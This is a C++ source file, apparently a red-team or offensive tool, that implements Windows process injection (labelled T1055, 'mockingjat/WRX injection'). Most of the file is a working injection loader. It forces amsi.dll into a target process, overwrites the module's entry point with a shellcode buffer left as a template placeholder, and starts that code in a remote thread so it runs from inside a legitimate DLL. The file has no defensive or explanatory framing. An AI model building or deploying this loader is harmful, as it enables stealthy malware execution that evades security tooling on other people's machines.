/**
Author: Thomas X Meng
T1055 Process Injection
Original remote mockingjat injection (WRX injection)
**/
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <string>
#include <ctype.h>

DWORD FindProcessId(const std::string& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processesSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

unsigned char magiccode[] = ####SHELLCODE####;


int main(int argc, char *argv[])
{
    printf("[+] Starting program...\n");

    HANDLE processHandle;
    PVOID remoteBuffer;
    wchar_t moduleToInject[] = L"C:\\windows\\system32\\amsi.dll";
    HMODULE modules[256] = {};
    SIZE_T modulesSize = sizeof(modules);
    DWORD modulesSizeNeeded = 0;
    DWORD moduleNameSize = 0;
    SIZE_T modulesCount = 0;
    CHAR remoteModuleName[128] = {};
    HMODULE remoteModule = NULL;

    if (argc != 2)
    {
        printf("[-] Usage: %s <PID or Process Name>\n", argv[0]);
        return 1;
    }

    DWORD pid = 0;
    if (isdigit(argv[1][0]))
    {
        pid = atoi(argv[1]);
    }
    else
    {
        pid = FindProcessId(argv[1]);
        if (pid == 0)
        {
            printf("[-] Failed to find process: %s\n", argv[1]);
            return 1;
        }
    }

    printf("[+] magiccode prepared...\n");

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (processHandle == NULL)
    {
        printf("[-] Failed to open process. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Process opened...\n");

    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("[-] Failed to allocate memory in remote process. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Memory allocated in remote process...\n");

    if (!WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof(moduleToInject), NULL)) {
        printf("[-] Failed to write process memory. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] DLL path written to remote process memory...\n");

    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    if (threadRoutine == NULL) {
        printf("[-] Failed to get address of LoadLibraryW. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Got address of LoadLibraryW...\n");

    HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
    if (dllThread == NULL) {
        printf("[-] Failed to create remote thread. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Remote thread created to load DLL...\n");

    WaitForSingleObject(dllThread, 1000);
    printf("[+] Waited for remote thread...\n");

    // find base address of the injected benign DLL in remote process
    if (!EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded)) {
        printf("[-] Failed to enumerate modules. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Modules enumerated...\n");


    modulesCount = modulesSizeNeeded / sizeof(HMODULE);
    bool foundModule = false;
    for (size_t i = 0; i < modulesCount; i++) {
        remoteModule = modules[i];
        GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName));
        if (std::string(remoteModuleName).compare("amsi.dll") == 0) {
            printf("[+] Found %s at %p\n", remoteModuleName, modules[i]);
            foundModule = true;
            break;
        }
    }
    if (!foundModule) {
        printf("[-] amsi.dll not found in remote process.\n");
        return 1;
    }

    // get DLL's AddressOfEntryPoint
    DWORD headerBufferSize = 0x1000;
    LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
    if (targetProcessHeaderBuffer == NULL) {
        printf("[-] Failed to allocate heap memory. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Heap memory allocated for reading DLL headers...\n");

    if (!ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL)) {
        printf("[-] Failed to read remote process memory. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Read remote process memory for DLL headers...\n");

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
    LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
    printf("[+] Calculated DLL entry point address: %p\n", dllEntryPoint);

    // write magiccode to DLL's AddressofEntryPoint
    if (!WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)magiccode, sizeof(magiccode), NULL)) {
        printf("[-] Failed to write magiccode to remote process. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] magiccode written to DLL's entry point...\n");

    // execute magiccode from inside the benign DLL
    if (CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL) == NULL) {
        printf("[-] Failed to create remote thread for magiccode execution. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Remote thread created for executing magiccode...\n");

    printf("[+] Operation completed. Exiting program...\n");
    return 0;

}
